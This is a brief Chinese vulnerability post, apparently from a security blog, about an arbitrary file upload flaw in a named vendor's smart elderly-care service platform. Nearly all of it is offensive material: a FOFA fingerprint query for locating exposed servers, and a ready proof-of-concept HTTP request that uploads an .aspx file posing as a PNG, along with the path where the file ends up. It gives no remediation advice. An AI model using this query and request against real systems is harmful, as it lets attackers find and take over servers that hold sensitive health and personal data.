#  广西金中软件集团有限公司智慧医养服务平台Uploads存在任意文件上传漏洞   
清晨  摸鱼划水   2025-04-22 03:55  
  
FOFA  
```
body="Content/css/Login/images/gtx-main-bg00004.png"
```  
  
POC  
```
# 文件上传位置：/Content/Upload/【年月】/【日】/1.aspx，如：/Content/Upload/202407/18/1.aspx
POST /Mobile/Uploads HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Length: 10338

-----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: image/png

123
-----------------------------45250802924973458471174811279
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qJ5apkMXic83ricxyvRPic2abacX0ymyjAWJpP3jn7kCtMEw2icf3NQrvZ9B2LTE3uwBvWzibcNibWEEibNTmTJcYxkmw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
